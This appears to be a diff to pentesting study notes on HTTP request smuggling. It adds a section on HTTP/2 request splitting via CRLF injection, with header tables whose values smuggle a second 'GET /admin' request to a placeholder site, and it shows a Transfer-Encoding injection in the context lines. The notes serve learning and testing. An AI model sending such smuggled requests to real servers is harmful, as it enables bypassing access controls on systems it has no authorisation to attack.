@@ -85,7 +85,7 @@ Front-end (HTTP/2):
 ```http/2
 bar        \r\nTransfer-Encoding: chunked
 ```
-Backend (HTTP/1.1):
+Back-end (HTTP/1.1):
 ```http
 Foo: bar
 Transfer-Encoding: chunked
@@ -93,3 +93,19 @@ Transfer-Encoding: chunked
 Note: it's necessary to enable  **Allow HTTP/2 ALPN** 
 How to work with kettled HTTP/2 in #burp https://www.youtube.com/watch?v=W3BGHKyf8RY
 
+# HTTP/2 request splitting via CRLF injection
+Split request in the headers after downgrading
+
+| :method    | GET                                                                        |
+| ---------- | -------------------------------------------------------------------------- |
+| :path      | /                                                                          |
+| :authority | vulnerable-website.com                                                     |
+| foo        | bar\r\n<br>\r\n<br>GET /admin HTTP/1.1\r\n<br>Host: vulnerable-website.com |
+Front-end servers typically strip the :authority pseudo-header and replace it with a new HTTP/1 Host header during downgrading. 
+During rewriting, some front-end servers append the new Host header to the end of the current list of headers. As far as an HTTP/2 front-end is concerned, this after the foo header
+
+| :method    | GET                                                                        |
+| ---------- | -------------------------------------------------------------------------- |
+| :path      | /                                                                          |
+| :authority | vulnerable-website.com                                                     |
+| foo        | bar\r\n<br>Host: vulnerable-website.com\r\n<br>\r\n<br>GET /admin HTTP/1.1 |
